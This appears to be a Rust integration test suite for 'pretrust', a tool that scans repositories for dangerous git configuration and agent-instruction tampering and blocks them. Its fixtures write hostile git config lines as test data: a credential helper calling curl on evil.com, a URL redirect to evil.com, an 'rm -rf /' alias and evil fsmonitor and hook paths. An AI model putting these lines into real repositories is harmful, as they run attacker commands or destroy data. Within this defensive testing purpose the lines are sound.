use std::fs;
use std::path::{Path, PathBuf};
use std::process::Command;
use tempfile::tempdir;

fn get_pretrust_bin() -> PathBuf {
    PathBuf::from(env!("CARGO_BIN_EXE_pretrust"))
}

fn ensure_fixture_git_configs(root: &Path) {
    let fixtures = root.join("tests").join("fixtures");

    let vuln_git = fixtures.join("vulnerable_repo").join(".git");
    let _ = fs::create_dir_all(&vuln_git);
    let _ = fs::write(
        vuln_git.join("config"),
        "[core]\n    fsmonitor = /tmp/evil_fsmonitor.sh\n    hooksPath = /tmp/evil_hooks\n[diff]\n    external = /tmp/evil_diff.sh\n[credential]\n    helper = !curl -s evil.com\n",
    );

    let unneutral_git = fixtures.join("unneutralizable_repo").join(".git");
    let _ = fs::create_dir_all(&unneutral_git);
    let _ = fs::write(
        unneutral_git.join("config"),
        "[url \"https://evil.com/\"]\n    insteadOf = https://github.com/\n[alias]\n    pwn = \"!rm -rf /\"\n",
    );
}

#[test]
fn test_1_config_sink_detection_suite() {
    let bin = get_pretrust_bin();
    let root = Path::new(env!("CARGO_MANIFEST_DIR"));
    ensure_fixture_git_configs(root);
    let vuln_fixture = root.join("tests").join("fixtures").join("vulnerable_repo");
    let output = Command::new(&bin)
        .args(["scan", vuln_fixture.to_str().unwrap(), "--json"])
        .output()
        .expect("failed to run scan");

    assert_eq!(output.status.code(), Some(1)); // Has High/Critical findings

    let stdout = String::from_utf8_lossy(&output.stdout);
    let report: serde_json::Value = serde_json::from_str(&stdout).expect("valid json output");

    let findings = report["findings"].as_array().expect("findings array");
    let rules: Vec<&str> = findings
        .iter()
        .filter_map(|f| f["rule_name"].as_str())
        .collect();

    assert!(rules.contains(&"GitFsMonitor"), "Missing GitFsMonitor");
    assert!(rules.contains(&"GitHooksPath"), "Missing GitHooksPath");
    assert!(rules.contains(&"GitDiffExternal"), "Missing GitDiffExternal");
    assert!(rules.contains(&"GitCredentialHelper"), "Missing GitCredentialHelper");
    assert!(rules.contains(&"VSCodeTasksFolderOpen"), "Missing VSCodeTasksFolderOpen");
    assert!(rules.contains(&"McpPromptInjection"), "Missing McpPromptInjection");
}

#[test]
fn test_2_environment_hardening_isolation_proof() {
    let bin = get_pretrust_bin();
    let dir = tempdir().unwrap();

    // 1. Initialize a real git repository with an initial commit
    let init_status = Command::new("git")
        .args(["init", "-b", "main"])
        .current_dir(dir.path())
        .status()
        .expect("git init failed");
    assert!(init_status.success());

    Command::new("git")
        .args(["config", "user.name", "Pretrust Test"])
        .current_dir(dir.path())
        .status()
        .unwrap();
    Command::new("git")
        .args(["config", "user.email", "test@pretrust.dev"])
        .current_dir(dir.path())
        .status()
        .unwrap();

    let commit_status = Command::new("git")
        .args(["commit", "--allow-empty", "-m", "initial commit"])
        .current_dir(dir.path())
        .status()
        .expect("git commit failed");
    assert!(commit_status.success());

    let marker_file = dir.path().join("proof_marker.txt");

    #[cfg(windows)]
    let script_file = dir.path().join("proof_of_exec.bat");
    #[cfg(not(windows))]
    let script_file = dir.path().join("proof_of_exec.sh");

    #[cfg(windows)]
    let script_content = format!(
        "@echo off\r\necho FS_FIRED > \"{}\"\r\necho 0\r\n",
        marker_file.display()
    );
    #[cfg(not(windows))]
    let script_content = format!(
        "#!/bin/sh\necho 'FS_FIRED' > {}\necho '0'\n",
        marker_file.display()
    );
    fs::write(&script_file, script_content).unwrap();

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mut perms = fs::metadata(&script_file).unwrap().permissions();
        perms.set_mode(0o755);
        fs::set_permissions(&script_file, perms).unwrap();
    }

    // Configure core.fsmonitor with forward slashes for cross-platform Git compatibility
    let script_str = script_file.to_str().unwrap().replace('\\', "/");
    let config_status = Command::new("git")
        .args(["config", "core.fsmonitor", &script_str])
        .current_dir(dir.path())
        .status()
        .expect("git config core.fsmonitor failed");
    assert!(config_status.success());

    // 3. Negative control: run git status WITHOUT pretrust hardening
    let unhardened_output = Command::new("git")
        .arg("status")
        .current_dir(dir.path())
        .output()
        .expect("unhardened git status failed");
    assert!(unhardened_output.status.success());
    assert!(
        marker_file.is_file(),
        "NEGATIVE CONTROL FAILED: Unhardened git status did not trigger core.fsmonitor script"
    );
    let marker_content = fs::read_to_string(&marker_file).unwrap();
    assert!(marker_content.contains("FS_FIRED"));

    // 4. Reset marker file
    fs::remove_file(&marker_file).unwrap();
    assert!(!marker_file.exists());

    // 5. Positive proof: run git status THROUGH pretrust CLI 'run' command
    let hardened_output = Command::new(&bin)
        .args(["run", "--", "git", "status"])
        .current_dir(dir.path())
        .output()
        .expect("pretrust run -- git status failed to execute");

    assert!(
        hardened_output.status.success(),
        "pretrust run failed: stderr={}",
        String::from_utf8_lossy(&hardened_output.stderr)
    );

    // CRITICAL PROOF ASSERTION:
    // marker_file MUST NOT exist because pretrust injected core.fsmonitor=false into process scope!
    assert!(
        !marker_file.exists(),
        "SECURITY VIOLATION: Hostile fsmonitor was executed despite running inside 'pretrust run'!"
    );
}

#[test]
fn test_3_tasks_auto_run_detection() {
    let bin = get_pretrust_bin();
    let root = Path::new(env!("CARGO_MANIFEST_DIR"));
    let tasks_fixture = root.join("tests").join("fixtures").join("tasks_repo");

    let output = Command::new(&bin)
        .args(["scan", tasks_fixture.to_str().unwrap(), "--json"])
        .output()
        .expect("failed to run scan");

    assert_eq!(output.status.code(), Some(1));
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("VSCodeTasksFolderOpen"));
}

#[test]
fn test_4_sarif_output_schema_validation() {
    let bin = get_pretrust_bin();
    let root = Path::new(env!("CARGO_MANIFEST_DIR"));
    ensure_fixture_git_configs(root);
    let vuln_fixture = root.join("tests").join("fixtures").join("vulnerable_repo");

    let output = Command::new(&bin)
        .args(["scan", vuln_fixture.to_str().unwrap(), "--sarif"])
        .output()
        .expect("failed to run scan");

    let stdout = String::from_utf8_lossy(&output.stdout);
    let sarif: serde_json::Value = serde_json::from_str(&stdout).expect("valid SARIF json");

    assert_eq!(sarif["version"], "2.1.0");
    assert_eq!(sarif["runs"][0]["tool"]["driver"]["name"], "pretrust");

    let results = sarif["runs"][0]["results"].as_array().expect("results array");
    assert!(results.len() >= 3);
}

#[test]
fn test_5_lockfile_tampering_detection() {
    let bin = get_pretrust_bin();
    let dir = tempdir().unwrap();

    fs::write(dir.path().join("AGENTS.md"), "Standard instruction v1\n").unwrap();
    fs::write(dir.path().join(".cursorrules"), "Rules v1\n").unwrap();

    // 1. Generate lockfile
    let lock_out = Command::new(&bin)
        .args(["lock", dir.path().to_str().unwrap()])
        .output()
        .expect("failed to run lock");
    assert_eq!(lock_out.status.code(), Some(0));
    assert!(dir.path().join("pretrust.lock").is_file());

    // 2. Clean check
    let check_clean = Command::new(&bin)
        .args(["lock", "--check", dir.path().to_str().unwrap()])
        .output()
        .expect("failed to check lock");
    assert_eq!(check_clean.status.code(), Some(0));

    // 3. Tamper with file
    fs::write(
        dir.path().join(".cursorrules"),
        "Modified rules with prompt injection\n",
    )
    .unwrap();

    let check_tampered = Command::new(&bin)
        .args(["lock", "--check", dir.path().to_str().unwrap()])
        .output()
        .expect("failed to check lock");
    assert_eq!(check_tampered.status.code(), Some(1));
    let stderr = String::from_utf8_lossy(&check_tampered.stderr);
    assert!(stderr.contains(".cursorrules"));
    assert!(stderr.contains("hash changed"));
}

#[test]
fn test_6_unneutralizable_sink_refusal() {
    let bin = get_pretrust_bin();
    let root = Path::new(env!("CARGO_MANIFEST_DIR"));
    ensure_fixture_git_configs(root);
    let unneutral_fixture = root.join("tests").join("fixtures").join("unneutralizable_repo");

    // Run inside unneutralizable_repo
    let refusal_out = Command::new(&bin)
        .args(["run", "--", "git", "--version"])
        .current_dir(&unneutral_fixture)
        .output()
        .expect("failed to run");

    assert_eq!(refusal_out.status.code(), Some(2));
    let stderr = String::from_utf8_lossy(&refusal_out.stderr);
    assert!(stderr.contains("PRETRUST SAFETY REFUSAL"));
    assert!(stderr.contains("GitUrlInsteadOf"));

    // Run with --allow-sinks
    let allow_out = Command::new(&bin)
        .args(["run", "--allow-sinks", "--", "git", "--version"])
        .current_dir(&unneutral_fixture)
        .output()
        .expect("failed to run");

    assert_eq!(allow_out.status.code(), Some(0));
    let stdout = String::from_utf8_lossy(&allow_out.stdout);
    assert!(stdout.contains("git version"));
}
